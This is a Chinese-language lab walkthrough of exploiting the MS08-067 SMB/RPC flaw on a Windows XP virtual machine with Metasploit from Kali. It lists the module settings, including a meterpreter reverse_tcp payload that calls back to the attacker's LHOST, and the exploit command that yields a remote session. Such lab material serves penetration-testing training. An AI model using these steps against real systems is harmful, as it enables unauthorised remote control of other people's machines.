## kali利用msf工具对ms08-067漏洞入侵靶机（win xp2）

### 漏洞简介

MS08-067漏洞将会影响Windows 2000/XP/Server 2003/Vista/Server
2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。

如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和
Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。
防火墙最佳做法和标准的默认防火墙配置有助于保护网络资源免受从企业外部发起的攻击。

### 实验环境：

工具：metasploit

靶机两台：windows xp2和kali2020

攻击机的IP（kali）：192.168.29.133

靶机IP（xp2）: 192.168.29.134

实验条件：两台机子可以互通的，并且windows xp2（需打开445端口，默认为打开）开启了445端口，防火墙是关闭的。

### 步骤：

 **（** **1** **）在kali终端输入msfconsole** **，启动** **Metasploit** **工具**

![1621858576_60ab9910ab60570126b25.png!small?1621858577458](https://image.3001.net/images/20210524/1621858576_60ab9910ab60570126b25.png!small?1621858577458)

 **（** **2** **）输入命令search** **ms** **08_** **0** **67,查找关于** **ms** **08_**
**0** **67的漏洞模块。**

![1621858587_60ab991be26b93680fb9d.png!small?1621858588222](https://image.3001.net/images/20210524/1621858587_60ab991be26b93680fb9d.png!small?1621858588222)

 **（** **3** **）输入如下命令，使用该漏洞模块**

![1621858596_60ab992458723eb368ed6.png!small?1621858597634](https://image.3001.net/images/20210524/1621858596_60ab992458723eb368ed6.png!small?1621858597634)

 **（** **4** **）** **进入这个模块后，** **用** **show options 查看该模块需要配置的参数**

![1621858607_60ab992f29771bc437717.png!small?1621858607570](https://image.3001.net/images/20210524/1621858607_60ab992f29771bc437717.png!small?1621858607570)

 **（** **5** **）设置配置项（show options）**

 **设置靶机IP（** **xp2** **）** **set RHOST 192.168.29.134**

![1621858621_60ab993d4df7cdd991aaa.png!small?1621858621596](https://image.3001.net/images/20210524/1621858621_60ab993d4df7cdd991aaa.png!small?1621858621596)

 **设置要执行的payload:** set payload windows/meterpreter/reverse_tcp

![1621858632_60ab994813a7faafe1a21.png!small?1621858632290](https://image.3001.net/images/20210524/1621858632_60ab994813a7faafe1a21.png!small?1621858632290)

 **设置攻击机的IP（kali）：** **set LHOST 192.168.29.133**

![1621858643_60ab995398414f3a7171b.png!small?1621858643921](https://image.3001.net/images/20210524/1621858643_60ab995398414f3a7171b.png!small?1621858643921)

 **设置要攻击的目标操作系统类型：** **set target 34**

![1621858657_60ab99615a29ddff0059e.png!small?1621858657641](https://image.3001.net/images/20210524/1621858657_60ab99615a29ddff0059e.png!small?1621858657641)

 **用show options查看相关参数是否配置正确**

![1621858669_60ab996d65512a2eea206.png!small?1621858669929](https://image.3001.net/images/20210524/1621858669_60ab996d65512a2eea206.png!small?1621858669929)

 **（6）** **最后，输入** **exploit，** **回车运行** **,进入到特殊的payload---meterpreter，该payload在控制靶机之后，能够对靶机执行更多的渗透攻击。用
pwd查看靶机当前的工作路径，用ipconfig命令查看靶机的IP地址配置**

![1621858691_60ab99832c43d7e3ca528.png!small?1621858691769](https://image.3001.net/images/20210524/1621858691_60ab99832c43d7e3ca528.png!small?1621858691769)

  

